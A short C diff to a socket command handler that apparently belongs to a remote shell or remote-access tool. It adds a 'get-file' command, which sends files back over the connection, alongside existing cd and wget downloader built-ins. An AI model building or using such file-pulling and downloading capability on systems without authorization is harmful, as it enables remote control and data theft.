@@ -2,7 +2,7 @@
 
 int process_command(struct main_struct *m_s)	// check if a command is a built in one
 {
-	if(my_strcmp(m_s->cmd, "exit\n")) {		// use custom my_strcmp to check
+    if(my_strcmp(m_s->cmd, "exit\n")) {		// use custom my_strcmp to check
 		m_s->cn = SOCKET_ERROR;			// close connection
 	} else if((m_s->cmd[0] == 'c') && (m_s->cmd[1] == 'd') && (m_s->cmd[2] == ' ')){ // chdir command integration
 		cd(m_s->cmd);
@@ -10,7 +10,12 @@ int process_command(struct main_struct *m_s)	// check if a command is a built in
 	} else if(m_s->cmd[0] == 'w' && m_s->cmd[1] == 'g' && m_s->cmd[2] == 'e' && m_s->cmd[3] == 't' && m_s->cmd[4] == ' ') {	// downloader command
 		wget(m_s->cmd);
 		sender(m_s->s, "File Downloaded", 16, &m_s->cn);
-	}
+    } else if(m_s->cmd[0] == 'g' && m_s->cmd[1] == 'e' && m_s->cmd[2] == 't' && m_s->cmd[3] == '-' && m_s->cmd[4] == 'f' && m_s->cmd[5] == 'i' && m_s->cmd[6] == 'l' && m_s->cmd[7] == 'e' && m_s->cmd[8] == ' ') {
+        if(get_file(m_s->cmd,m_s->s) < 0){
+            sender(m_s->s, "-1", 3, &m_s->cn);
+        }
+    }
+
 	return 0;
 }
 
